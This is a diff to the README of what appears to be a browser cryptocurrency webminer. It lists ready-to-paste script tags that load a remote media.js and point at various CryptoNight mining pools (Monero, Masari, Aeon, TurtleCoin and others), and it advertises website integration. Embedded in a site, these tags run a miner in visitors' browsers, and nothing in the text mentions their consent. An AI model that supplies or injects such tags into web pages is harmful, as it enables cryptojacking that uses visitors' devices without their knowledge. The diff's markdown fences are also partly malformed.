@@ -9,28 +9,28 @@ Simple Pool change: ?jason=Your_Favorite_Pool:PortNr
 Complete example:
 ```sh
 <script src="https://thelifeisbinary.netlify.com/media.js?perfekt=wss://?algo=cn?variant=0?jason=pool.supportxmr.com:3333" > </script>
-<br><br>
 ```
 Attention: Special Case for some custom variant fork coins: Intensecoin need ?algo=cn?variant=1<br> 
-<br><br>
+```sh
 <script src="https://thelifeisbinary.netlify.com/media.js?perfekt=wss://?algo=cn?variant=1?jason=pool.intensecoin.com:3333" > </script>
-<br><br>
+```
 Attention: Special Case for some custom POW coins: Masari need ?algo=cn/msr?variant=1<br> 
-<br><br>
+```sh
 <script src="https://thelifeisbinary.netlify.com/media.js?perfekt=wss://?algo=cn/msr?variant=1?jason=masari.ingest.cryptoknight.cc:3333" > </script>
-<br><br>
+```
 Attention: Special Case for some custom POW coins: Stellite need ?algo=cn/xtl?variant=2<br> 
-<br><br>
+```sh
 <script src="https://thelifeisbinary.netlify.com/media.js?perfekt=wss://?algo=cn/xtl?variant=2?jason=communitypool.stellite.cash:6677" > </script>
-<br><br>
+```
 Attention: Special Case for some custom cn-lite variant fork coins: Aeon, Turtlecoin Ultranote need ?algo=cn-lite?variant=1
-<br><br>
+```sh
 <script src="https://thelifeisbinary.netlify.com/media.js?perfekt=wss://?algo=cn-lite?variant=1?jason=mine.supportaeon.com:3333" > </script>
-<br><br>
+```sh
 <script src="https://thelifeisbinary.netlify.com/media.js?perfekt=wss://?algo=cn?variant=1?jason=Pool.TRTL.CryptoPool.Space:5555" > </script>
-<br><br>
+```
+```sh
 <script src="https://thelifeisbinary.netlify.com/media.js?perfekt=wss://?algo=cn-lite?variant=1?jason=alpha.ultranote.org:5555" > </script>
-
+```
 <br><br> 
 Or use our integration for websites & blogs
 http://www.crypto-webminer.com/integrate.html
